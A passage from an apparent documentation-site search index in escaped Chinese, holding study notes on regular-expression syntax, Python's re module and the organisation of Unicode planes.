\u5339\u914d\u4efb\u4f55\u7a7a\u767d\u5b57\u7b26\uff0c\u76f8\u5f53\u4e8e [ \\f\\n\\r\\t\\v]\uff0cunicode \u4e0b\u4e5f\u4f1a\u5339\u914d\u5168\u89d2\u7a7a\u683c\u7b26 \\S \u5339\u914d\u4efb\u4f55\u975e\u7a7a\u767d\u7b26\uff0c\u76f8\u5f53\u4e8e [^ \\f\\n\\r\\t\\v]"},{"location":"cs/regex/#_5","title":"\u9650\u5b9a\u7b26","text":"<p>\u7528\u6765\u6307\u5b9a\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u51fa\u73b0\u4e86\u591a\u5c11\u6b21</p> \u8bed\u6cd5 \u63cf\u8ff0 {n} \u524d\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u5339\u914d\u51c6\u786e\u7684 n \u6b21\uff0c\u5982 o{2} \u5339\u914d\u4e24\u4e2a\u8fde\u7eed\u7684 o {n,} \u524d\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u5339\u914d\u81f3\u5c11 n \u6b21\uff0c\u5982 o{2,} \u53ef\u4ee5\u5339\u914d goooood \u4e2d\u7684\u6240\u6709 o\uff0c\u4f46\u4e0d\u5339\u914d god \u4e2d\u7684 o {n,m} \u524d\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u5339\u914d\u81f3\u5c11 n \u6b21\uff0c\u81f3\u591a m \u6b21 * \u524d\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u5339\u914d 0 \u6b21\u6216\u591a\u6b21\uff0c\u76f8\u5f53\u4e8e {0,} + \u524d\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u5339\u914d 1 \u6b21\u6216\u591a\u6b21\uff0c\u76f8\u5f53\u4e8e {1,} ? \u524d\u4e00\u4e2a\u5b50\u8868\u8fbe\u5f0f\u53ef\u6709\u53ef\u65e0\uff08\u5339\u914d 0 \u6b21\u6216 1 \u6b21\uff09\uff0c\u76f8\u5f53\u4e8e {0,1}"},{"location":"cs/regex/#_6","title":"\u8d2a\u5a6a","text":"<p>* \u548c + \u7684\u5339\u914d\u90fd\u662f\u8d2a\u5a6a\u7684\uff0c\u5373\u5c3d\u53ef\u80fd\u5339\u914d\u66f4\u591a\u7684\u5b57\u7b26\uff0c\u800c\u5728\u5b83\u4eec\u540e\u9762\u52a0\u4e0a ? \u5c31\u53ef\u4ee5\u975e\u8d2a\u5a6a\uff08\u5373\u6700\u5c0f\u5339\u914d\uff09</p> <ul> <li>&lt;.*&gt; \u4f1a\u5339\u914d\u6574\u4e2a <code>&lt;h1&gt;header&lt;/h1&gt;</code> \u5b57\u7b26\u4e32</li> <li>&lt;.*?&gt; \u53ea\u4f1a\u5339\u914d\u5176\u4e2d\u7684 <code>&lt;h1&gt;</code> \u548c <code>&lt;/h1&gt;</code></li> </ul>"},{"location":"cs/regex/#_7","title":"\u5b9a\u4f4d\u7b26","text":"<p>\u53ea\u5339\u914d\u4f4d\u7f6e\uff0c\u6ca1\u6709\u5b57\u7b26\u4e0e\u4e4b\u5bf9\u5e94</p> \u8bed\u6cd5 \u63cf\u8ff0 ^ \u5339\u914d\u5b57\u7b26\u4e32\u5f00\u5934\uff0c\u5982\u679c\u662f\u591a\u884c\u6a21\u5f0f\uff0c\u5219\u65b0\u7684\u4e00\u884c\u4e5f\u7b97\u65b0\u7684\u5b57\u7b26\u4e32 $ \u5339\u914d\u5b57\u7b26\u4e32\u7ed3\u5c3e\uff0c\u591a\u884c\u6a21\u5f0f\u540c\u7406\u770b\u6210\u591a\u4e2a\u5b57\u7b26\u4e32 \\b \u5339\u914d\u5355\u8bcd\u8fb9\u754c\uff0c\u5373\u5b57\u7b26\u4e0e\u7a7a\u683c\u4e2d\u95f4\u7684\u4f4d\u7f6e \\B \u5339\u914d\u975e\u5355\u8bcd\u8fb9\u754c <p>\u5b9a\u4f4d\u7b26\u53ea\u80fd\u5355\u72ec\u4f7f\u7528\uff0c\u4e0d\u80fd\u9644\u52a0\u9650\u5236\u7b26\u6307\u5b9a\u4e2a\u6570</p>"},{"location":"cs/regex/#_8","title":"\u5206\u7ec4","text":"<p>\u7528 () \u53ef\u4ee5\u6307\u5b9a\u5339\u914d\u4e00\u4e2a\u7ec4\uff0c\u4f7f\u7528 () \u53ef\u4ee5\u6307\u5b9a\u4e0d\u540c\u9009\u9879\uff0c\u6bcf\u4e00\u9879\u95f4\u7528 | \u5206\u9694</p> <p>\u540c\u65f6 () \u4e5f\u662f\u6355\u83b7\u5206\u7ec4\uff0c\u5373\u62ec\u53f7\u5185\u5339\u914d\u7684\u5185\u5bb9\u4f1a\u88ab\u7f13\u5b58\uff0c\u5982\u679c\u8981\u907f\u514d\u8fd9\u79cd\uff0c\u9700\u8981\u4f7f\u7528 (?:) \u975e\u6355\u83b7\u5143\u6765\u8fdb\u884c\u5339\u914d</p>"},{"location":"cs/regex/#_9","title":"\u53cd\u5411\u5f15\u7528","text":"<p>\u88ab\u7f13\u5b58\u7684\u6355\u83b7\u5206\u7ec4\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 \\n \u518d\u6b21\u5f15\u7528\uff0c\u5176\u4e2d n \u662f 1 \u5230 2 \u4f4d\u7684\u5341\u8fdb\u5236\u6570 \u6355\u83b7\u5206\u7ec4\u7684\u7f16\u53f7\u4ece 1 \u5f00\u59cb\uff0c\u6700\u591a 99 \u4e2a\uff0c\\1 \u5373\u8868\u793a\u548c\u7b2c\u4e00\u4e2a\u5706\u62ec\u53f7\u4e2d\u5339\u914d\u7684\u7ed3\u679c\u76f8\u540c\u7684\u90e8\u5206</p> <p>\u5982 (abc|def)\\1 \u5339\u914d abcabc\u3001defdef \u4f46\u4e0d\u5339\u914d abcdef\u3001defabc</p>"},{"location":"cs/regex/#_10","title":"\u5148\u884c\u65ad\u8a00\u548c\u540e\u884c\u65ad\u8a00","text":"<p>\u6b63\u5219\u8868\u8fbe\u5f0f\u6709\u5148\u884c\u65ad\u8a00\uff08lookahead\uff09\u548c\u540e\u884c\u65ad\u8a00\uff08lookbehind\uff09\uff0c\u5206\u4e3a\u56db\u79cd\u5f62\u5f0f\uff1a</p> \u8bed\u6cd5 \u540d\u79f0 (?=pattern) \u96f6\u5bbd\u6b63\u5411\u5148\u884c\u65ad\u8a00zero-width positive lookahead assertion (?!pattern) \u96f6\u5bbd\u8d1f\u5411\u5148\u884c\u65ad\u8a00zero-width negative lookahead assertion (?&lt;=pattern) \u96f6\u5bbd\u6b63\u5411\u540e\u884c\u65ad\u8a00zero-width positive lookbehind assertion (?&lt;!pattern) \u96f6\u5bbd\u8d1f\u5411\u540e\u884c\u65ad\u8a00zero-width negative lookbehind assertion <p>\u548c\u5b9a\u4f4d\u7b26\u7c7b\u4f3c\uff0c\u5b83\u53ea\u5339\u914d\u4f4d\u7f6e\uff0c\u4e0d\u5339\u914d\u5185\u5bb9\uff0c\u6240\u4ee5\u53eb\u505a\u96f6\u5bbd\uff08zero-width\uff09\uff0c\u8fd9\u4e9b\u4f4d\u7f6e\u7684\u89c4\u5219\u662f\uff1a</p> <ul> <li>(?=pattern)\uff1a\u5339\u914d\u540e\u9762\u53ef\u4ee5\u5339\u914d pattern \u7684\u4f4d\u7f6e</li> <li>(?!pattern)\uff1a\u5339\u914d\u540e\u9762\u65e0\u6cd5\u5339\u914d pattern \u7684\u4f4d\u7f6e</li> <li>(?&lt;=pattern)\uff1a\u5339\u914d\u524d\u9762\u53ef\u4ee5\u5339\u914d pattern \u7684\u4f4d\u7f6e</li> <li>(?&lt;!pattern)\uff1a\u5339\u914d\u524d\u9762\u65e0\u6cd5\u5339\u914d pattern \u7684\u4f4d\u7f6e</li> </ul> \u4f8b\u5b50 <p></p> <p>\u5176\u4e2d\u540e\u884c\u65ad\u8a00\u6709\u4e9b\u8bed\u8a00\u4e0d\u652f\u6301\uff08python re \u652f\u6301\uff09</p>"},{"location":"cs/regex/#_11","title":"\u4fee\u9970\u7b26","text":"<p>\u4fee\u9970\u7b26\u4e0d\u5c5e\u4e8e\u8868\u8fbe\u5f0f\u7684\u5185\u5bb9\uff0c\u4f46\u662f\u6307\u5b9a\u4e86\u5339\u914d\u7684\u89c4\u5219\uff0cjs \u4e2d\u7684\u6b63\u5219\u5199\u6cd5\u4e3a /pattern/flags \u5176\u4e2d flags \u5c31\u662f\u4fee\u9970\u7b26</p> \u4fee\u9970\u7b26 \u540d\u79f0 \u542b\u4e49 i ignore \u5ffd\u7565\u5927\u5c0f\u5199 g global \u5168\u5c40\u5339\u914d\uff0c\u67e5\u627e\u6240\u6709\u5339\u914d\u9879 m multi-line \u591a\u884c\u5339\u914d\uff0c\u4f7f ^$ \u5339\u914d\u6bcf\u884c\u7684\u5f00\u5934\u548c\u7ed3\u5c3e s single-line \u5355\u884c\u5339\u914d\uff0c\u53ea\u89c6\u4e3a\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c. \u4e5f\u53ef\u4ee5\u5339\u914d\u6362\u884c\u7b26 <p>\u4e0d\u540c\u8bed\u8a00\u4e2d\u5199\u6cd5\u548c\u79cd\u7c7b\u4e0d\u540c</p>"},{"location":"cs/regex/#_12","title":"\u4f18\u5148\u7ea7","text":"<p>\u6b63\u5219\u8868\u8fbe\u5f0f\u4e5f\u6709\u4f18\u5148\u7ea7\uff0c\u540c\u4e00\u4f18\u5148\u7ea7\u5219\u4ece\u5de6\u5411\u53f3\u8fd0\u7b97\uff0c\u4e0d\u540c\u4f18\u5148\u7ea7\u5219\u4ece\u9ad8\u5230\u4f4e\u3002\u4ece\u9ad8\u5230\u4f4e\uff1a</p> <ul> <li>\u8f6c\u4e49\u7b26 <code>\\</code></li> <li>\u62ec\u53f7\u7b26 <code>(...) (?:...) (?=...) (?!...) (?&lt;=...) (?&lt;!...) [...] [^...]</code></li> <li>\u9650\u5b9a\u7b26 <code>* + ? {n} {n,} {n,m}</code></li> <li>\u5b9a\u4f4d\u7b26 <code>^ $</code></li> <li>\u5b57\u7b26</li> <li>\u6216 <code>|</code></li> </ul>"},{"location":"cs/regex/#python-re","title":"Python re \u6a21\u5757","text":"<p>python \u7684 re \u6a21\u5757\u63d0\u4f9b\u4e86\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u76f8\u5173\u65b9\u6cd5\uff1a</p> <ul> <li>re.match(pattern, string, flags=0)\uff1a\u4f7f\u7528 pattern \u4ece\u5934\u5339\u914d string\uff0cflags \u4e3a\u4fee\u9970\u7b26\u3002\u5339\u914d\u5931\u8d25\u8fd4\u56de None\uff0c\u5339\u914d\u6210\u529f\u8fd4\u56de\u4e00\u4e2a re.Match</li> <li>re.search(pattern, string, flags=0)\uff1a\u4f7f\u7528 pattern \u626b\u63cf\u6574\u4e2a string\uff0c\u8fd4\u56de\u7b2c\u4e00\u4e2a\u5339\u914d\u7684 re.Match</li> <li>re.sub(pattern, repl, string, count=0, flags=0)\uff1a<ul> <li>pattern\uff1a\u8981\u88ab\u66ff\u6362\u90e8\u5206\u7684\u6b63\u5219\u8868\u8fbe\u5f0f</li> <li>repl\uff1a\u66ff\u6362\u7684\u5b57\u7b26\u4e32\uff0c\u6216\u8005\u66ff\u6362\u7528\u7684\u51fd\u6570<ul> <li>\u662f\u51fd\u6570\u65f6\u63a5\u53d7\u4e00\u4e2a re.Match\uff0c\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32</li> </ul> </li> <li>string\uff1a\u539f\u5b57\u7b26\u4e32</li> <li>count\uff1a\u66ff\u6362\u7684\u6700\u5927\u6b21\u6570\uff0c\u662f 0 \u65f6\u8868\u793a\u66ff\u6362\u5168\u90e8</li> <li>flags\uff1a\u4fee\u9970\u7b26</li> </ul> </li> <li>re.compile(pattern, flags=0)\uff1a\u7f16\u8bd1\u4e00\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u8fd4\u56de\u4e00\u4e2a re.Pattern</li> <li>re.findall(pattern, string, flags=0)\uff1a\u5728 string \u4e2d\u67e5\u627e\u6240\u6709\u5339\u914d pattern \u7684\u7ed3\u679c\uff0c\u8fd4\u56de\u5217\u8868</li> <li>re.finditer(pattern, string, flags=0)\uff1a\u5728 string \u4e2d\u67e5\u627e\u6240\u6709\u5339\u914d pattern \u7684\u90e8\u5206\uff0c\u8fd4\u56de\u8fed\u4ee3\u5668</li> <li>re.split(pattern, string, maxsplit=0, flags=0)\uff1a<ul> <li>pattern\uff1a\u8981\u4fdd\u7559\u90e8\u5206\u7684\u6b63\u5219\u8868\u8fbe\u5f0f</li> <li>string\uff1a\u539f\u5b57\u7b26\u4e32</li> <li>maxsplit\uff1a\u5206\u9694\u6b21\u6570\uff0c\u662f 0 \u662f\u5168\u90e8\u5206\u9694</li> <li>flags\uff1a\u4fee\u9970\u7b26</li> <li>\u8fd4\u56de\u4e00\u4e2a\u5206\u5272\u540e\u7684\u5217\u8868</li> </ul> </li> <li>re.escape(pattern)\uff1a\u8f6c\u4e49 pattern \u4e2d\u7684\u7279\u6b8a\u5b57\u7b26</li> </ul>"},{"location":"cs/regex/#repattern","title":"re.Pattern","text":"<p>\u7528\u6cd5\u7c7b\u4f3c\u76f4\u63a5\u4f7f\u7528 re\uff0c\u53ea\u662f\u8fdb\u884c\u4e86\u9884\u7f16\u8bd1\uff0c\u5e76\u4e14\u56fa\u5b9a\u4e86 pattern \u548c flags</p> <ul> <li>Pattern.search(string[, pos[, endpos]])</li> <li>Pattern.match(string[, pos[, endpos]])</li> <li>Pattern.fullmatch(string[, pos[, endpos]])</li> <li>Pattern.split(string, maxsplit=0)</li> <li>Pattern.findall(string[, pos[, endpos]])</li> <li>Pattern.finditer(string[, pos[, endpos]])</li> <li>Pattern.sub(repl, string, count=0)</li> <li>Pattern.pattern\uff1a\u6b63\u5219\u8868\u8fbe\u5f0f</li> <li>Pattern.flags\uff1a\u4fee\u9970\u7b26</li> <li>Pattern.groups\uff1aint \u503c\uff0cpattern \u4e2d\u6355\u83b7\u7ec4\u7684\u4e2a\u6570</li> <li>Pattern.groupindex\uff1a\u4e00\u4e2a\u5b57\u5178\uff0c\u5982\u679c pattern \u4e2d\u5305\u542b (?P&lt;name&gt;...) \u5219\u5305\u542b\u4e00\u4e2a\u4ece name \u6620\u5c04\u5230\u6355\u83b7\u7ec4\u7f16\u53f7\u7684\u952e\u503c\u5bf9</li> </ul>"},{"location":"cs/regex/#rematch","title":"re.Match","text":"<p>re.Match \u662f match \u548c search \u5728\u6210\u529f\u5339\u914d\u65f6\u8fd4\u56de\u7684\u7c7b\u578b</p> <ul> <li>Match.group([group])\uff1a\u8fd4\u56de\u5b57\u7b26\u4e32<ul> <li>group() \u6216 group(0) \u8fd4\u56de\u5339\u914d\u7684\u5b8c\u6574\u5b57\u7b26\u4e32</li> <li>group(i) \u8fd4\u56de\u7b2c i \u4e2a\u6355\u83b7\u7ec4</li> </ul> </li> <li>Match.start([group])\uff1aMatch.group([group]) \u5728\u6574\u4e2a\u539f\u5b57\u7b26\u4e32\u4e2d\u7684\u8d77\u59cb\u4f4d\u7f6e\uff08\u5b50\u4e32\u7b2c\u4e00\u4e2a\u5b57\u7b26\u7684\u7d22\u5f15\uff09</li> <li>Match.end([group])\uff1aMatch.group([group]) \u5728\u6574\u4e2a\u539f\u5b57\u7b26\u4e32\u4e2d\u7684\u7ed3\u675f\u4f4d\u7f6e\uff08\u5b50\u4e32\u6700\u540e\u4e00\u4e2a\u5b57\u7b26\u7d22\u5f15+1\uff09</li> <li>Match.span([group])\uff1a\u8fd4\u56de (Match.start([group]), Match.end([group]))</li> <li>Match.__gettiem__([group])\uff1a\u7b49\u540c\u4e8e .group([group])</li> </ul>"},{"location":"cs/regex/#_13","title":"\u989d\u5916\u8bed\u6cd5","text":"<ul> <li>(?#...)\uff1a\u6ce8\u91ca\uff0c\u76f4\u63a5\u5ffd\u7565</li> <li>(?P...)\uff1a\u4e3a\u6355\u83b7\u7ec4\u547d\u540d\u4e3a name\uff08\u5fc5\u987b\u662f\u5408\u6cd5 python \u53d8\u91cf\u540d\uff0c\u5e76\u4e14\u540c\u4e00\u4e2a pattern \u4e2d\u4e0d\u80fd\u91cd\u590d\uff09\uff0c\u540e\u9762\u53ef\u4ee5\u901a\u8fc7 name \u5f15\u7528\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u7f16\u53f7\u5f15\u7528\u3002\u5728 Match.group([group]) \u7684 group \u4e2d\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 \"name\" \u6765\u83b7\u53d6\u8fd9\u4e2a\u6355\u83b7\u7ec4 <li>(?P=name)\uff1a\u4e0e\u540d\u5b57\u4e3a name \u7684\u6355\u83b7\u7ec4\u5b8c\u5168\u76f8\u540c\u7684\u90e8\u5206\uff0c\u76f8\u5f53\u4e8e\u901a\u8fc7\u7f16\u53f7\u5f15\u7528</li> <li>(?(id/name)yes-pattern|no-pattern)\uff1a\u5982\u679c\u7f16\u53f7\u4e3a id \u6216\u8005\u540d\u5b57\u4e3a name \u7684\u6355\u83b7\u7ec4\u5b58\u5728\uff0c\u5219\u6b64\u5904\u4f7f\u7528 yes-pattern\uff0c\u5426\u5219\u4f7f\u7528 no-pattern<ul> <li>\u4f8b\u5982\uff1a<code>(&lt;)?(\\w+@\\w+(?:\\.\\w+)+)(?(1)&gt;|$)</code> \u5339\u914d <code>'&lt;user@host.com&gt;'</code> \u548c <code>'user@host.com'</code>\uff0c\u4f46\u4e0d\u5339\u914d <code>'&lt;user@host.com'</code> \u548c <code>'user@host.com&gt;'</code></li> </ul> </li>"},{"location":"cs/regex/#_14","title":"\u6807\u8bc6\u7b26","text":"\u6807\u8bc6\u7b26 \u542b\u4e49 re.I \u5ffd\u7565\u5927\u5c0f\u5199 re.L \u672c\u5730\u5316\u8bc6\u522b\u5339\u914d\uff08\u4e0d\u53ef\u9760\uff09 re.M \u591a\u884c\u5339\u914d re.S \u5355\u884c\u5339\u914d\uff0c\u4f7f . \u540c\u6837\u5339\u914d\u6362\u884c\u7b26 re.U \u4f7f\u7528 unicode\uff0c\u5f71\u54cd \\w\\W\\b\\B re.X \u4f7f\u7528 python \u4e00\u6837\u7684\u6ce8\u91ca\uff0c\u5e76\u4e14\u6709\u591a\u884c pattern \u7684\u4f18\u5316\uff0c\u4f7f\u6b63\u5219\u66f4\u6613\u8bfb <p>\u540c\u65f6\u4f7f\u7528\u591a\u4e2a\u6807\u8bc6\u7b26\uff0c\u7528 | \u9694\u5f00\uff08\u5982 re.I | re.M \u8868\u793a\u591a\u884c\u4e14\u5ffd\u7565\u5927\u5c0f\u5199\uff09</p> re.X \u7684\u4f8b\u5b50 <p><pre><code>a = re.compile(r\"\"\"\\d +  # the integral part\n                   \\.    # the decimal point\n                   \\d *  # some fractional digits\"\"\", re.X)\nb = re.compile(r\"\\d+\\.\\d*\")\n</code></pre> a b \u7b49\u4ef7</p>"},{"location":"cs/unicode/","title":"Unicode \u7edf\u4e00\u7801","text":"<p> \u7ea6 2502 \u4e2a\u5b57  9 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 8 \u5206\u949f</p> <p>Unicode\uff08\u522b\u540d Universal coded character set (UCS)\uff09\uff0c\u5b98\u65b9\u4e2d\u6587\u540d\u79f0\u4e3a\u7edf\u4e00\u7801\uff0c\u662f\u8ba1\u7b97\u673a\u79d1\u5b66\u9886\u57df\u7684\u4e1a\u754c\u6807\u51c6\u3002\u5b83\u6574\u7406\u3001\u7f16\u7801\u4e86\u4e16\u754c\u4e0a\u5927\u90e8\u5206\u7684\u6587\u5b57\u7cfb\u7edf\uff0c\u4f7f\u5f97\u7535\u8111\u53ef\u4ee5\u7528\u66f4\u4e3a\u7b80\u5355\u7684\u65b9\u5f0f\u6765\u5448\u73b0\u548c\u5904\u7406\u6587\u5b57\u3002</p> <p>Unicode \u4f34\u968f\u7740\u901a\u7528\u5b57\u7b26\u96c6\u7684\u6807\u51c6\u800c\u53d1\u5c55\uff0c\u540c\u65f6\u4e5f\u4ee5\u4e66\u672c\u7684\u5f62\u5f0f\u5bf9\u5916\u53d1\u8868\u3002Unicode \u81f3\u4eca\u4ecd\u5728\u4e0d\u65ad\u589e\u4fee\uff0c\u6bcf\u4e2a\u65b0\u7248\u672c\u90fd\u52a0\u5165\u66f4\u591a\u65b0\u7684\u5b57\u7b26\u3002\u76ee\u524d\u6700\u65b0\u7684\u7248\u672c\u4e3a 2021 \u5e74 9 \u6708\u516c\u5e03\u7684 14.0.0\uff0c\u5df2\u7ecf\u6536\u5f55\u8d85\u8fc714\u4e07\u4e2a\u5b57\u7b26\uff08\u7b2c\u5341\u4e07\u4e2a\u5b57\u7b26\u5728 2005 \u5e74\u83b7\u91c7\u7eb3\uff09\u3002Unicode \u9664\u4e86\u89c6\u89c9\u4e0a\u7684\u5b57\u5f62\u3001\u7f16\u7801\u65b9\u6cd5\u3001\u6807\u51c6\u7684\u5b57\u7b26\u7f16\u7801\u8d44\u6599\u5916\uff0c\u8fd8\u5305\u542b\u4e86\u5b57\u7b26\u7279\u6027\uff08\u5982\u5927\u5c0f\u5199\u5b57\u6bcd\uff09\u3001\u4e66\u5199\u65b9\u5411\u3001\u62c6\u5206\u6807\u51c6\u7b49\u7279\u6027\u7684\u8d44\u6599\u5e93\u3002 \u2014\u2014\u2014\u2014 \u7ef4\u57fa\u767e\u79d1</p> <p>Abstract</p> <p>\u4e00\u76f4\u89c9\u5f97 Unicode \u548c UTF-8 \u7f16\u7801\u5f88\u6709\u610f\u601d\uff0c\u5c31\u770b\u4e86\u770b</p> <ul> <li>Unicode \u5b98\u7f51</li> <li>Unicode \u5b57\u7b26\u767e\u79d1\uff08\u4e2d\u6587\uff09</li> <li>Unicode \u6807\u51c6\uff1aISO/IEC 10646:2020</li> <li>ISO/IEC 10646:2020 \u5b98\u65b9\u5f00\u653e\u4e0b\u8f7d\u5730\u5740</li> </ul>"},{"location":"cs/unicode/#unicode_1","title":"Unicode \u5b57\u7b26\u96c6","text":"<p>Unicode \u7684\u5b57\u7b26\u96c6\u4ee5\u5206\u7ec4\u7684\u5f62\u5f0f\u8fdb\u884c\u7f16\u6392\uff0c\u6574\u4f53\u5206\u4e3a 17 \u4e2a\u5e73\u9762\uff08Plane\uff09  </p> <p>\u6bcf\u4e2a\u5e73\u9762\u4e2d\u6709 \\(2^{16}\\) \u4e2a\u7801\u4f4d\uff08codepoint\uff09\uff0c\u5373\u53ef\u4ee5\u5305\u542b 65536 \u4e2a\u5b57\u7b26\uff0c\u6574\u4f53\u6700\u591a\u53ef\u4ee5\u5305\u542b 111w+ \u4e2a\u5b57\u7b26\uff0c\u4f46\u76ee\u524d\u53ea\u4f7f\u7528\u4e86\u5c11\u6570\u5e73\u9762\u5171 14w+ \u4e2a\u5b57\u7b26</p> <p>Unicode \u5b57\u7b26\u96c6\u4e2d\u6bcf\u4e2a\u5b57\u7b26\u90fd\u6709\u4e00\u4e2a\u7f16\u53f7\uff0c\u5373\u5b57\u7b26\u503c\u3002\u5316\u4e3a\u5341\u516d\u8fdb\u5236\u540e\u540e\u56db\u4f4d\u4e3a\u5728\u5f53\u524d\u5e73\u9762\u4e0a\u7684\u7801\u503c\uff0c\u524d\u9762\u5269\u4f59\u7684\u4e3a\u5e73\u9762\u7f16\u53f7 \u6bd4\u5982 \"\u9e64\" \u8fd9\u4e2a\u5b57\u7b26\u7684\u5b57\u7b26\u503c\u662f 0x9E64\uff0c\u8868\u793a\u4e3a U+9E64</p>"},{"location":"cs/unicode/#_1","title":"\u5b57\u7b26\u5e73\u9762\u6620\u5c04","text":"\u5e73\u9762\u7f16\u53f7 \u5b57\u7b26\u503c\u8303\u56f4 \u540d\u79f0 0 U+0000 ~ U+FFFF BMP\uff08Basic Multilingual Plane\uff09\u57fa\u672c\u591a\u6587\u79cd\u5e73\u9762 1 U+10000 ~ U+1FFFF SMP\uff08Supplementary Multilingual Plane\uff09\u591a\u6587\u79cd\u8865\u5145\u5e73\u9762 2 U+20000 ~ U+2FFFF SIP\uff08Supplementary Ideographic Plane\uff09\u8868\u610f\u6587\u5b57\u8865\u5145\u5e73\u9762 3 U+30000 ~ U+3FFFF TIP\uff08Tertiary Ideographic Plane\uff09\u8868\u610f\u6587\u5b57\u7b2c\u4e09\u5e73\u9762 4~13 U+40000 ~ U+DFFFF Reserved Planes \u5c1a\u672a\u4f7f\u7528 14 U+E0000 ~ U+EFFFF SSP\uff08Supplementary Special-purpose Plane\uff09\u7279\u522b\u7528\u9014\u8865\u5145\u5e73\u9762 15 U+F0000 ~ U+FFFFF PUA-A\uff08Private Use Area-A\uff09\u79c1\u4eba\u4f7f\u7528\u533a A \u533a 16 U+100000 ~ U+10FFFF PUA-B\uff08Private Use Area-B\uff09\u79c1\u4eba\u4f7f\u7528\u533a B \u533a BMP \u5e73\u9762\uff08\u57fa\u672c\u591a\u6587\u79cd\u5e73\u9762\uff09 <p> \u8be6\u89c1\uff1a</p> <ul> <li>Unicode \u5b57\u7b26\u767e\u79d1</li> <li>\u57fa\u672c\u591a\u6587\u79cd\u5e73\u9762 - \u7ef4\u57fa\u767e\u79d1</li> </ul> SMP \u5e73\u9762\uff08\u7b2c\u4e00\u8f85\u52a9\u5e73\u9762\uff09 <p> \u4e3b\u8981\u6446\u653e\u7edd\u5927\u591a\u6570\u53e4\u4ee3\u6587\u5b57\uff0c\u73b0\u65f6\u5df2\u4e0d\u518d\u4f7f\u7528\u6216\u5f88\u5c11\u4f7f\u7528\u6587\u5b57\u3001\u901f\u8bb0\u3001\u6570\u5b66\u5b57\u6bcd\u7b26\u53f7\u3001\u97f3\u7b26\u3001\u56fe\u5f62\u7b26\u53f7\u53ca\u7528\u4e8e\u5b66\u8005\u7684\u4e13\u4e1a\u8bba\u6587\u4e2d\u4f7f\u7528\u7684\u53e4\u8001\u6216\u8fc7\u65f6\u7684\u8bed\u8a00\u4e66\u5199\u7b26\u53f7\uff0c\u4ee5\u53ca emoji</p> <p>\u8be6\u89c1\uff1a</p> <ul> <li>Unicode \u5b57\u7b26\u767e\u79d1</li> <li>\u7b2c\u4e00\u8f85\u52a9\u5e73\u9762 - \u7ef4\u57fa\u767e\u79d1</li> </ul> SIP \u5e73\u9762\uff08\u7b2c\u4e8c\u8f85\u52a9\u5e73\u9762\uff09 <p> \u5168\u4e3a CJK \u5b57\u7b26\uff0c\u5305\u542b\u5c11\u7528\u7684\u6c49\u5b57\u4ee5\u53ca\u67d0\u4e9b\u65b9\u8a00\u6587\u5b57</p> <ul> <li>U+20000 ~ U+2A6DF\uff1a\u4e2d\u65e5\u97e9\u7edf\u4e00\u8868\u610f\u6587\u5b57\u6269\u5c55B\u533a\uff08CJK Unified Ideographs Extension B\uff0943253 \u4e2a\u6c49\u5b57</li> <li>U+2A700 ~ U+2B73F\uff1a\u4e2d\u65e5\u97e9\u7edf\u4e00\u8868\u610f\u6587\u5b57\u6269\u5c55C\u533a\uff08CJK Unified Ideographs Extension C\uff094149 \u4e2a\u6c49\u5b57</li> <li>U+2B740 ~ U+2B81F\uff1a\u4e2d\u65e5\u97e9\u7edf\u4e00\u8868\u610f\u6587\u5b57\u6269\u5c55D\u533a\uff08CJK Unified Ideographs Extension D\uff09222 \u4e2a\u6c49\u5b57</li> <li>U+2B820 ~ U+2CEAF\uff1a\u4e2d\u65e5\u97e9\u7edf\u4e00\u8868\u610f\u6587\u5b57\u6269\u5c55E\u533a\uff08CJK Unified Ideographs Extension E\uff095762 \u4e2a\u6c49\u5b57</li> <li>U+2CEB0 ~ U+2EBEF\uff1a\u4e2d\u65e5\u97e9\u7edf\u4e00\u8868\u610f\u6587\u5b57\u6269\u5c55F\u533a\uff08CJK Unified Ideographs Extension F\uff097473 \u4e2a\u6c49\u5b57</li> <li>U+2F800 ~ U+2FA1F\uff1a\u4e2d\u65e5\u97e9\u517c\u5bb9\u8868\u610f\u6587\u5b57\u589e\u8865\uff08CJK Compatibility Ideographs Supplement\uff09542 \u4e2a\u6c49\u5b57</li> </ul> TIP \u5e73\u9762\uff08\u7b2c\u4e09\u8f85\u52a9\u5e73\u9762\uff09 <p>\u5df2\u5206\u914d U+30000 ~ U+3134F \u4e3a\u4e2d\u65e5\u97e9\u7edf\u4e00\u8868\u610f\u6587\u5b57\u6269\u5c55G\u533a\uff0c\u5305\u542b\u7532\u9aa8\u6587\u3001\u91d1\u6587\u3001\u5c0f\u7bc6\u3001\u4e2d\u56fd\u6218\u56fd\u65f6\u671f\u6587\u5b57\u7b49</p> SSP \u5e73\u9762\uff08\u7b2c\u5341\u56db\u8f85\u52a9\u5e73\u9762\uff09 <p>\u5747\u4e3a\u63a7\u5236\u5b57\u7b26</p> <ul> <li>U+E0000 ~ U+E007F\uff1a\u8bed\u8a00\u7f16\u7801\u6807\u7b7e\uff08Tags\uff09</li> <li>U+E0100 ~ U+E01EF\uff1a\u5b57\u5f62\u53d8\u6362\u9009\u53d6\u5668\uff08Variation Selectors Supplement\uff09</li> </ul> \u79c1\u4eba\u4f7f\u7528\u533a <p>Unicode \u4e2d\u4e00\u5171\u6709\u4e09\u4e2a\u79c1\u4eba\u4f7f\u7528\u533a\uff1a</p> <ul> <li>U+E000 ~ U+F8FF\uff1a\u57fa\u672c\u591a\u6587\u79cd\u5e73\u9762 \u79c1\u4eba\u4f7f\u7528\u533a</li> <li>U+F0000 ~ U+FFFFD\uff1a\u79c1\u4eba\u4f7f\u7528\u533a A \u533a</li> <li>U+100000 ~ U+10FFFD\uff1a\u79c1\u4eba\u4f7f\u7528\u533a B \u533a</li> </ul> <p>\u4e00\u822c\u7528\u4e8e\u67d0\u4e9b\u6807\u51c6\u6765\u89c4\u5b9a Unicode 